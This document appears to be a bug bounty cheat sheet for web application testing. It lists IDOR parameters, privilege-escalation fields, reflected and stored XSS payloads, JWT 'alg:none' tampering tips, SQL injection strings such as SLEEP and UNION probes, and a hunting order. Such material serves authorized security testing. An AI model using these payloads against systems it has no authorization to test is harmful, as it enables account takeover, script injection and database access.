
# Quick Bug Bounty Rapid-Fire Cheat Sheet

Use on any new target. Minimal checks + payloads only.

---

## Broken Access Control / IDOR
- Change user IDs, tokens, roles.
- Remove auth headers.

**Payloads**
```
id 
user_id
uid
account_id
profile_id
record_id
order_id
session_id
auth
auth_token
access_token
token
isAdmin=true
role=admin
accessLevel=admin

```

---

## Reflected XSS
Test query/path params for reflection.

**Payloads**
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
'";alert(1);//
</textarea><script>alert(1)</script>

```

**Params** 
```
?q= 
?search= 
?query= 
?term= 
?redirect= 
?next= 
?returnUrl= 
?username= 
?email= 
?name= 
?message=

```

---

## Stored XSS
Inputs that persist (profile, comments, reviews).

**Payloads:**
```
<img src=x onerror=alert(1)>
</script><script>alert(1)</script>
<svg/onload=alert(1)>
" onfocus=alert(1) "
```

---

## JWT
- Decode + tamper claims (`role`, `isAdmin`).  
- Try `alg:none`.  

**Params** 

```

Authorization: Bearer <token>
access_token
id_token
jwt
session_token

```
---


## SQL Injection
- Insert `' OR '1'='1`  
- Time delay if blind.

**Payloads**

```
' OR '1'='1
" OR "1"="1
' OR SLEEP(5)--
' UNION SELECT NULL,NULL--
```

**Params:** 

``` 

id
user
username
email
search
q
product_id
order_id
category

``` 

---


## Unauthenticated Access
- Replay requests w/o tokens.  
- Access /admin, /dashboard, /profile.  
- Add `isAdmin=true` unauth.


---

# Hunting Flow
1. Test IDOR & auth bypass.  
2. Quick XSS (reflected + stored).  
3. JWT tampering.  
4. SQLi basics.  
5. Unauth access checks.  

---
